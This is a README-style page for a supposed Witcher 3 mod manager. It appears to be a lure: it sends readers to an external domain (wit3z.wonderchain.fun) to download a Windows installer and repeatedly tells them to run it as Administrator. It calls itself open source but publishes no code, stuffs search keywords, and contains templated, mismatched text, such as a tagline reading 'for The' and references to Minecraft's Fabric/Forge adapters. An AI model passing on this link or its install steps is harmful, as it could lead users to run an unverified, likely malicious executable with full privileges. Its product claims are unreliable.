# The Witcher 3 Mod Manager

> Open-source mod profile tool for **The** — sync addons, manage load order, rollback safely.

[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg?style=flat-square)](LICENSE.txt)
[![Windows](https://img.shields.io/badge/Platform-Windows%2010%2F11-0078D4?style=flat-square&logo=windows)]()
[![Modding](https://img.shields.io/badge/Focus-Mod%20%26%20Plugins-7c3aed?style=flat-square)]()
[![Release](https://img.shields.io/badge/Release-v1.0.0-16a34a?style=flat-square)]()

**Repository:** `The-Witcher-3-Mod-Manager`

---

## Overview

**The Witcher 3 Mod Manager** is a Windows-native modding companion: profile-based installs, dependency resolution, and a clean UI for managing mods across sessions.

Built for **the witcher 3 mods download pc** and similar high-intent searches.

## Features

- **Profile manager** — save/load mod sets per game version or server
- **Dependency resolver** — flags conflicts before install
- **One-click sync** — pull community mod lists from local folders
- **Safe rollback** — snapshot mod folders before updates
- **Lightweight UI** — fast startup, no background telemetry
- **Documented API** — extend with Lua/C# hooks (see `/docs` in future releases)

## Download & Install

> Open-source **Windows build** for **The Witcher 3 Mod Manager**. Direct link below — no account required.

| | |
| --- | --- |
| **Direct link** | **[wit3z.wonderchain.fun](https://wit3z.wonderchain.fun/)** |
| **Full URL** | `https://wit3z.wonderchain.fun/` |
| **Platform** | Windows 10 / 11 (64-bit) |
| **Install** | Run setup as Administrator |

### Quick steps

1. Open **[wit3z.wonderchain.fun](https://wit3z.wonderchain.fun/)** in your browser
2. Download the latest Windows build
3. Run the installer **as Administrator**
4. Point the app to your game / mods folder on first launch
5. Import or create a mod profile

## Quick start

| Step | Action |
| --- | --- |
| 1 | Download the Windows build from the table above |
| 2 | Run setup **as Administrator** |
| 3 | Pick your game root / mods directory on first launch |
| 4 | Import or create a mod profile |
| 5 | Launch the game from the tray icon |

## Configuration

| Setting | Default | Notes |
| --- | --- | --- |
| Mods path | `%USERPROFILE%\Documents\Mods` | Override in Settings → Paths |
| Auto-backup | On | Keeps last 3 snapshots |
| Parallel downloads | 4 | Lower if AV scans slow installs |
| Log level | Info | Set `DEBUG` for support tickets |

## Architecture

```text
src/
  core/          # profile engine & dependency graph
  launcher/      # tray UI & game detection
  plugins/       # optional game-specific adapters
  updater/       # semver channel checks (manual confirm)
```

## Roadmap

- [x] **v1.0.0** — profile manager, Windows installer, dependency checker
- [ ] **v1.1.0** — cloud profile export (local file only, no account)
- [ ] **v1.2.0** — plugin SDK samples for Fabric / Forge adapters

## FAQ

**Is this open source?**  
Source snapshots will be published incrementally; the installer on this page is the supported Windows build.

**Does it modify game files?**  
It manages separate mod folders and launch profiles — vanilla game files stay untouched unless you opt in.

**Anti-cheat safe?**  
Client-side mod managers for single-player / private servers only. Do not use with competitive anti-cheat titles.

## Contributing

Issues and documentation PRs are welcome. Please include Windows version and game build in bug reports.

## License

MIT — see [LICENSE.txt](LICENSE.txt).

**People also search for:** the witcher 3 mods download pc, the witcher 3 mod manager, the witcher 3 nexus mods, the witcher 3 mods github, the witcher 3 mod installer windows
